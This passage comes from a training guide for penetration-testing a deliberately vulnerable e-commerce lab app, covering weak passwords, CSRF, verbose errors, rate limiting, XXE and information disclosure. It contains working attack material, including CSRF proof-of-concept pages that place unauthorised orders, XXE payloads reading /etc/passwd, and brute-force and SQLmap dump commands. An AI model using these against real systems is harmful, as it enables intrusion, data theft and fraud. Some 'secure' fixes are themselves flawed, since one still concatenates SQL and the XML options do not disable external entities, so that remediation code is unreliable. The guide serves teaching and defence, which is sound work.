

### 🟡 MEDIUM Severity

#### 9. Weak Password Policy
**Location**: Registration form  
**Impact**: Easy credential guessing, successful brute force attacks  
**OWASP**: A07:2021 - Identification and Authentication Failures

**How to Test:**

**Step 1: Test Minimum Length**

1. Navigate to `/register`
2. Fill in the registration form:
   - Username: `testuser1`
   - Email: `test1@example.com`
   - Password: `a` (single character)
   - Company: `Test Company`
3. Click **Register**

**Expected Result:**
✅ **Vulnerability Confirmed**: Registration succeeds with a 1-character password

Summary: No complexity requirements/checks, any common passwords allowed

**Expected Result:**
✅ **Vulnerability Confirmed**: All weak passwords are accepted

**Why This is Dangerous:**
- **Brute force attacks**: Easy to guess passwords
- **Dictionary attacks**: Common passwords quickly cracked
- **Credential stuffing**: Leaked passwords from other sites work
- **Social engineering**: Predictable passwords

**Industry Standards:**
- **Minimum length**: 12+ characters (NIST recommendation)
- **Complexity**: Mix of uppercase, lowercase, numbers, symbols
- **Common password blocking**: Check against known weak passwords
- **Password strength meter**: Visual feedback to users

**Remediation:**
```typescript
// ❌ VULNERABLE: No password validation
app.post('/api/register', (req, res) => {
  const { username, password } = req.body;
  // No password checks!
  db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, password);
});

// ✅ SECURE: Strong password policy
import passwordValidator from 'password-validator';

const schema = new passwordValidator();
schema
  .is().min(12)                                    // Minimum length 12
  .is().max(100)                                   // Maximum length 100
  .has().uppercase()                               // Must have uppercase
  .has().lowercase()                               // Must have lowercase
  .has().digits(1)                                 // Must have at least 1 digit
  .has().symbols(1)                                // Must have at least 1 symbol
  .has().not().spaces()                            // Should not have spaces
  .is().not().oneOf(['Password123!', 'Admin123!']); // Blacklist common

app.post('/api/register', (req, res) => {
  const { username, password } = req.body;
  
  if (!schema.validate(password)) {
    return res.status(400).json({ 
      error: 'Password must be at least 12 characters with uppercase, lowercase, numbers, and symbols' 
    });
  }
  
  // Hash password before storing
  const hashedPassword = await bcrypt.hash(password, 10);
  db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, hashedPassword);
});
```

#### 10. Missing Cross Site Request Forgery (CSRF) Protection

CSRF is an exploit that forces an authenticated end-user to submit an unwanted request to a web application they are currently logged into. The key point is that the request comes from the user's browser, which includes the user's valid session cookies, making the request appear legitimate to the server.


**Locations**: All state-changing endpoints (POST, PUT, DELETE)  
**Impact**: Unauthorised actions on behalf of authenticated users  
**OWASP**: A01:2021 - Broken Access Control

**How to Test:**

**Step 1: Check for CSRF Tokens**

1. Login to the application
2. Press **F12** and go to **Network** tab
3. Submit a form (e.g., update profile, place order)
4. Examine the request in Network tab
5. Look for CSRF token in:
   - Request headers (e.g., `X-CSRF-Token`)
   - Request body (e.g., `_csrf` field)
   - Hidden form fields

**Expected Result:**
✅ **Vulnerability Confirmed**: No CSRF tokens present

**Step 2: Check Cookie SameSite Attribute**

1. Press **F12** and go to **Storage** tab
2. Expand **Cookies** → `http://<TARGETIP>:5000`
3. Click on the `connect.sid` cookie
4. Check the **SameSite** attribute

**Expected Result:**
✅ **Vulnerability Confirmed**: SameSite is not set or set to `None`

**Step 3: Create a CSRF Proof of Concept**

Create a file called `csrf-attack.html` on your local machine:

```html
<!DOCTYPE html>
<html>
<head>
  <title>CSRF Attack Demo</title>
</head>
<body>
  <h1>Win a Free Prize!</h1>
  <p>Click the button below to claim your prize...</p>
  
  <button onclick="attack()">Claim Prize</button>
  
  <script>
    function attack() {
      fetch('http://<TARGETIP>:5000/api/user', {
        method: 'PATCH',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          bio: 'HACKED BY CSRF ATTACK!',
          phone: '000-HACKED'
        })
      })
      .then(r => r.json())
      .then(data => alert('Profile updated! ' + JSON.stringify(data)))
      .catch(e => alert('Error: ' + e));
    }
    
    // Auto-submit version (more dangerous)
    // window.onload = attack;
  </script>
</body>
</html>
```

**Step 4: Serve the Attack Page**

You need to serve the HTML file from a web server (not open it as `file://`) for cookies to work:

```bash
# In the directory containing csrf-attack.html, run:
python3 -m http.server 8000
```

**Step 5: Test the CSRF Attack**

1. Login to Manchester Fresh Foods in Firefox
2. Keep the browser tab open (stay logged in)
3. In a new tab, navigate to `http://localhost:8000/csrf-attack.html`
4. Click "Claim Prize" button
5. An alert should appear saying "Profile updated!"
6. Go back to Manchester Fresh Foods and navigate to your profile

**Expected Result:**
✅ **Vulnerability Confirmed**: Your profile bio has been changed to "HACKED BY CSRF ATTACK!"

**Step 5: More Dangerous CSRF - Place Unauthorised Order**

Create `csrf-order.html`:

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Loading...</h1>
  <script>
    // Automatically place an order on behalf of the victim
    fetch('http://<TARGETIP>:5000/api/orders', {
      method: 'POST',
      credentials: 'include', // Include cookies
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        items: [
          {productId: 'prod-1', productName: 'Hacked Product', quantity: 100, pricePerUnit: '10.00', subtotal: '1000.00'}
        ],
        totalAmount: '1000.00',
        deliveryAddress: '123 Attacker Street',
        notes: 'CSRF Attack - Unauthorised Order'
      })
    })
    .then(r => r.json())
    .then(data => {
      document.body.innerHTML = '<h1>Order Placed!</h1><p>Order: ' + JSON.stringify(data) + '</p>';
    })
    .catch(e => {
      document.body.innerHTML = '<h1>Error!</h1><p>' + e + '</p>';
    });
  </script>
</body>
</html>
```

**Test:**
1. Stay logged in to Manchester Fresh Foods
2. Open `csrf-order.html` in a new tab
3. Check "My Orders" in the application

**Expected Result:**
✅ **Vulnerability Confirmed**: An unauthorised order has been placed

**Why This is Dangerous:**
- **Unauthorised transactions**: Place orders, transfer funds
- **Account modification**: Change email, password, profile
- **Privilege escalation**: Add admin users
- **Data manipulation**: Delete records, modify settings

**Real-World Attack Scenario:**
1. Attacker sends phishing email with link to malicious page
2. Victim clicks link while logged into vulnerable application
3. Malicious page submits requests using victim's session
4. Actions appear legitimate (same browser, valid session)

**Remediation:**
```typescript
// ❌ VULNERABLE: No CSRF protection
app.post('/api/profile', (req, res) => {
  // No token validation
  updateProfile(req.session.userId, req.body);
});

// ✅ SECURE: CSRF token validation
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });

app.post('/api/profile', csrfProtection, (req, res) => {
  // Token automatically validated by middleware
  updateProfile(req.session.userId, req.body);
});

// ✅ ALSO: Set SameSite cookie attribute
app.use(session({
  secret: 'secret',
  cookie: {
    sameSite: 'strict', // or 'lax'
    httpOnly: true,
    secure: true // HTTPS only
  }
}));
```


#### 11. Verbose Error Messages
**Location**: All error responses  
**Impact**: Information disclosure aids further attacks  
**OWASP**: A05:2021 - Security Misconfiguration

**How to Test:**

**Step 1: Trigger Application Errors**

**Test 1: Invalid JSON**
```bash
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{invalid json}'
```

**Test 2: Missing Required Fields**
```bash
curl -X POST http://<TARGETIP>:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{}'
```

**Test 3: Invalid Data Types**
```bash
curl -X POST http://<TARGETIP>:5000/api/orders \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"items": "not-an-array"}'
```

**Step 2: Trigger Database Errors**

**Test 1: SQL Syntax Error**
1. Navigate to `/products`
2. In the search box, enter: `'`
3. Observe the error message

**Using curl:**
```bash
curl "http://<TARGETIP>:5000/api/products?search='" 
```

**Test 2: Invalid Foreign Key**
```bash
curl -X POST http://<TARGETIP>:5000/api/orders \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"items":[{"productId":"invalid-id","quantity":1}]}'
```

**Step 3: Analyse Error Responses**

Look for sensitive information in error messages:

**Example Verbose Error:**
```json
{
  "error": "SQLITE_ERROR: near \"'\": syntax error",
  "stack": "Error: SQLITE_ERROR\n    at Database.prepare (/app/server/database.ts:45:12)\n    at searchProducts (/app/server/routes.ts:123:8)",
  "query": "SELECT * FROM products WHERE name LIKE '%'%'",
  "file": "/app/server/routes.ts",
  "line": 123
}
```

**What This Reveals:**
- ❌ Database type (SQLite)
- ❌ Exact SQL query being executed
- ❌ File paths and directory structure
- ❌ Line numbers in source code
- ❌ Technology stack (Node.js, TypeScript)

**Step 4: Using Firefox Developer Tools**

1. Press **F12** and go to **Console** tab
2. Trigger errors intentionally:
```javascript
// Invalid API call
fetch('/api/nonexistent-endpoint')
  .then(r => r.json())
  .then(data => console.log(data))

// Malformed request
fetch('/api/orders', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: 'invalid'
})
.then(r => r.json())
.then(data => console.log('Error details:', data))
```

**Expected Result:**
✅ **Vulnerability Confirmed**: Detailed error messages with:
- Stack traces
- File paths
- Database structure
- SQL queries
- Internal implementation details

**Why This is Dangerous:**
- **Information disclosure**: Reveals technology stack
- **Attack surface mapping**: Shows file structure
- **Vulnerability identification**: Exposes SQL queries for injection testing
- **Reconnaissance**: Helps attackers plan targeted attacks

**What Attackers Learn:**
- Database type and version
- Programming language and framework
- File system structure
- Third-party libraries
- Vulnerable code locations

**Remediation:**
```typescript
// ❌ VULNERABLE: Detailed error exposure
app.get('/api/products', (req, res) => {
  try {
    const query = `SELECT * FROM products WHERE name LIKE '%${req.query.search}%'`;
    const results = db.prepare(query).all();
    res.json(results);
  } catch (error) {
    // Exposes everything!
    res.status(500).json({
      error: error.message,
      stack: error.stack,
      query: query,
      file: error.fileName,
      line: error.lineNumber
    });
  }
});

// ✅ SECURE: Generic error messages
app.get('/api/products', (req, res) => {
  try {
    const query = `SELECT * FROM products WHERE name LIKE '%${req.query.search}%'`;
    const results = db.prepare(query).all();
    res.json(results);
  } catch (error) {
    // Log detailed error server-side only
    console.error('Database error:', error);
    
    // Return generic message to client
    res.status(500).json({
      error: 'An error occurred processing your request'
    });
  }
});

// ✅ PRODUCTION: Custom error handler
app.use((error, req, res, next) => {
  // Log full error details server-side
  logger.error({
    message: error.message,
    stack: error.stack,
    url: req.url,
    method: req.method
  });
  
  // Return generic error to client
  res.status(500).json({
    error: 'Internal server error',
    requestId: req.id // For support reference
  });
});
```

#### 12. No Rate Limiting
**Locations**: Login, registration, all endpoints  
**Impact**: Brute force attacks, credential stuffing, DoS  
**OWASP**: A07:2021 - Identification and Authentication Failures

**How to Test:**

**Method 1: Using curl (Simple)**

**Step 1: Test Login Endpoint**
```bash
# Attempt 100 rapid login requests
for i in {1..100}; do
  curl -X POST http://<TARGETIP>:5000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"test$i\"}" \
    -s -o /dev/null -w "Request $i: %{http_code}\n"
done
```

**Expected Result:**
✅ **Vulnerability Confirmed**: All 100 requests succeed without blocking

**Why This is Dangerous:**
- **Brute force attacks**: Try thousands of passwords
- **Credential stuffing**: Test leaked credentials
- **Denial of Service**: Overwhelm server resources

**Remediation:**
```typescript
// ❌ VULNERABLE: No rate limiting
app.post('/api/login', (req, res) => {
  const user = authenticateUser(req.body.username, req.body.password);
  res.json(user);
});

// ✅ SECURE: Implement rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Limit each IP to 5 requests per windowMs
  message: 'Too many login attempts, please try again later'
});

app.post('/api/login', loginLimiter, (req, res) => {
  const user = authenticateUser(req.body.username, req.body.password);
  res.json(user);
});
```

#### 13. XML External Entity (XXE) Injection
**Location**: `POST /api/import-order`  
**Impact**: File disclosure, SSRF, denial of service  
**OWASP**: A05:2021 - Security Misconfiguration

**How to Test:**

**Step 1: Login and Test Basic XML**

```bash
# Login first
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"thepubco","password":"welcome123"}' \
  -c cookies.txt

# Test basic XML submission (note: JSON format with xml field)
curl -X POST http://<TARGETIP>:5000/api/import-order \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"xml": "<?xml version=\"1.0\"?><order><customer>Test</customer></order>"}'
```

**Step 2: Test XXE - Read System Files**

```bash
# Attempt to read /etc/passwd
curl -X POST http://<TARGETIP>:5000/api/import-order \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"xml": "<?xml version=\"1.0\"?><!DOCTYPE order [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><order><customer>&xxe;</customer></order>"}'
```

**Step 3: Test XXE - Read Application Files**

```bash
# Read package.json (adjust path as needed)
curl -X POST http://<TARGETIP>:5000/api/import-order \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"xml": "<?xml version=\"1.0\"?><!DOCTYPE order [<!ENTITY xxe SYSTEM \"file:///app/package.json\">]><order><customer>&xxe;</customer></order>"}'
```

**Step 4: Using Firefox Developer Tools**

1. Login to the application
2. Press **F12** and go to **Console** tab
3. Test XXE with JavaScript:

```javascript
// Basic XXE test
fetch('/api/import-order', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    xml: '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><customer>&xxe;</customer></order>'
  })
})
.then(r => r.json())
.then(data => console.log('XXE Response:', data))
```

**Expected Result:**
✅ **Vulnerability Confirmed**: File contents appear in the response

**Why This is Dangerous:**
- **File disclosure**: Read sensitive files
- **SSRF**: Access internal network resources
- **Denial of Service**: Billion laughs attack

**Remediation:**
```typescript
// ❌ VULNERABLE: Default XML parser
import xml2js from 'xml2js';
const parser = new xml2js.Parser();

// ✅ SECURE: Disable external entities
const parser = new xml2js.Parser({
  explicitRoot: false,
  explicitArray: false,
  ignoreAttrs: false,
  xmlns: false,
  // Disable XXE
  strict: true,
  async: false
});
```

#### 14. Information Disclosure
**Locations**: Various endpoints and files  
**Impact**: Reconnaissance data for further attacks  
**OWASP**: A05:2021 - Security Misconfiguration

**How to Test:**

**Test 1: Git Repository Exposure**

```bash
# Check if .git directory is exposed
curl http://<TARGETIP>:5000/.git/HEAD
curl http://<TARGETIP>:5000/.git/config
```

**Expected Result:**
✅ **Vulnerability Confirmed**: Git files are accessible

**Test 2: Configuration Endpoints**

```bash
# Try common config endpoints
curl http://<TARGETIP>:5000/api/config
curl http://<TARGETIP>:5000/config.json
curl http://<TARGETIP>:5000/.env
```

**Test 3: Data File Exposure**

```bash
# Try accessing data files
curl http://<TARGETIP>:5000/data/customers.txt
curl http://<TARGETIP>:5000/data/orders.csv
```

**Test 4: robots.txt**

```bash
curl http://<TARGETIP>:5000/robots.txt
```

**Why This is Dangerous:**
- **Source code exposure**: Reveals vulnerabilities
- **Credential leaks**: Database passwords, API keys
- **PII exposure**: Customer data

**Remediation:**
- Block access to sensitive directories
- Never commit secrets to Git
- Use proper access controls


---

## Tool Recommendation Matrix

Match each vulnerability to the best testing tool:

| Vulnerability | Primary Tool | Alternative Tools |
|--------------|--------------|-------------------|
| **SQL Injection** | SQLmap, Burp Intruder | curl, ZAP, Manual (DevTools) |
| **Stored XSS** | Firefox Developer Tools, Burp | ZAP, Manual testing |
| **IDOR** | Burp Repeater, curl | Postman, DevTools Console |
| **Weak Passwords** | Burp Intruder, Hydra | Custom Python script |
| **Session Hijacking** | Cookie Editor, Burp | EditThisCookie, curl |
| **CSRF** | Burp, Custom HTML form | curl, Postman |
| **Rate Limiting** | Burp Intruder | curl loop, Python script |
| **SSRF** | curl, Burp Repeater | Postman |
| **LFI** | curl, Browser | Burp Repeater |
| **XXE** | Burp Repeater, curl | Postman |
| **Info Disclosure** | Nikto, curl | Browser, ZAP Spider |
| **Plaintext Passwords** | SQLmap (dump users) | Burp (observe responses) |
| **Predictable Sessions** | Burp Sequencer | Cookie Editor + manual |
| **Verbose Errors** | ZAP, Nikto | Any tool (trigger errors) |
| **Exposed Secrets** | Firefox Developer Tools Debugger | grep source files |

---

## Complete Penetration Testing Workflow

Follow this methodology to systematically test Manchester Fresh Foods:

### Phase 1: Reconnaissance (30 minutes)

**Goal**: Map the application and identify attack surface

```bash
# 1. Technology detection
# Open application in browser with Wappalyzer enabled

# 2. Spider the application
nikto -h http://<TARGETIP>:5000

# 3. Manual exploration
# - Browse all public pages (/, /products, /contact, /login, /register)
# - Login and explore authenticated pages
# - Note all forms, inputs, and API endpoints

# 4. Intercept traffic with Burp/ZAP
# - Enable proxy
# - Click through entire application
# - Review Site Map in Burp to see all endpoints discovered
```

**Expected Endpoints Discovered:**
```
Public:
- GET  /
- GET  /products
- GET  /contact
- GET  /login
- GET  /register
- GET  /instructor
- GET  /api/products
- GET  /api/products/search?query=
- POST /api/login
- POST /api/register
- POST /api/contact

Authenticated (Customer):
- GET  /dashboard
- GET  /dashboard/orders
- GET  /dashboard/place-order
- GET  /dashboard/invoices
- GET  /dashboard/profile
- GET  /api/user
- GET  /api/orders
- GET  /api/orders/:id
- POST /api/orders
- POST /api/profile

Admin:
- All customer endpoints plus full order visibility
```

---

### Phase 2: Automated Scanning (45 minutes)

**Goal**: Let tools find low-hanging fruit

```bash
# 1. ZAP Automated Scan
# Run full automated scan while you work on manual tests

# 2. SQLmap against login
sqlmap -r login-request.txt --batch --dbms=SQLite --dump-all

# 3. Nikto full scan
nikto -h http://<TARGETIP>:5000 -Tuning x -o nikto-report.html -Format html
```

**Review automated findings and prioritize manual verification**

---

### Phase 3: Manual Exploitation (2-3 hours)

**Test each vulnerability systematically:**

**1. Authentication (30 min)**
- [ ] SQL injection in login (`' OR '1'='1' --`)
- [ ] Default credentials (`admin/admin123`)
- [ ] Weak password policy (register with `a`)
- [ ] Session predictability (login/logout 5x, analyze pattern)

**2. Authorization (30 min)**
- [ ] IDOR in orders (access other customer orders)
- [ ] IDOR in profiles (view/edit other user profiles)
- [ ] Admin functions accessible to customers

**3. Injection Attacks (45 min)**
- [ ] SQL injection in product search
- [ ] Stored XSS in profile bio
- [ ] Stored XSS in order notes
- [ ] Stored XSS in contact form
- [ ] XXE in order import (if implemented)

**4. Information Disclosure (20 min)**
- [ ] Verbose error messages (trigger errors)
- [ ] Exposed secrets in JS source
- [ ] Directory traversal attempts
- [ ] Database credential exposure

**5. Session Management (20 min)**
- [ ] Cookie analysis (missing flags)
- [ ] Session fixation
- [ ] Session hijacking via predictable IDs

**6. Security Controls (20 min)**
- [ ] CSRF (create external form)
- [ ] Rate limiting (100 login attempts)
- [ ] SSRF (if /api/fetch-document exists)
- [ ] LFI (if /api/view-document exists)

---

### Phase 4: Documentation (1-2 hours)

For each vulnerability found:

1. **Take screenshots** showing the exploit
2. **Save HTTP requests/responses** from Burp
3. **Document exact reproduction steps**
4. **Assess real-world impact**
5. **Provide remediation recommendations**

**Deliverable**: Professional penetration test report with:
- Executive summary
- Methodology
- Findings (Critical → Low severity)
- Evidence for each finding
- Remediation roadmap

---

## Professional Reporting

When documenting vulnerabilities, include:

1. **Vulnerability Title** (e.g., "IDOR in Order Viewing")
2. **Severity Rating** (Critical/High/Medium/Low)
3. **Description** - What the vulnerability is
4. **Steps to Reproduce** - Detailed instructions
5. **Evidence** - Screenshots, HTTP requests/responses
6. **Impact** - What an attacker could do
7. **Remediation** - How to fix it
8. **CVSS Score** (if applicable)
9. **OWASP Top 10 Reference** (e.g., A01:2021 - Broken Access Control)

---

## Ethical Guidelines

✅ **DO**:
- Test only this deliberately vulnerable application
- Document findings systematically
- Learn the impact of each vulnerability
- Understand proper remediation techniques
- Practice responsible disclosure principles

❌ **DON'T**:
- Test real websites without authorisation
- Share these techniques for malicious purposes
- Deploy this vulnerable code to production
- Use customer data outside this educational context

---

## Need Help?

**Instructor Documentation**: Navigate to `/instructor` and enter password `penetration-test-2024` for complete vulnerability details and testing hints.

**Stuck on a vulnerability?**: The instructor docs provide:
- All 15 vulnerability locations
- Specific testing techniques
- Tool recommendations
- Expected impacts
- Exploitation examples

---

Happy ethical hacking! 🛡️
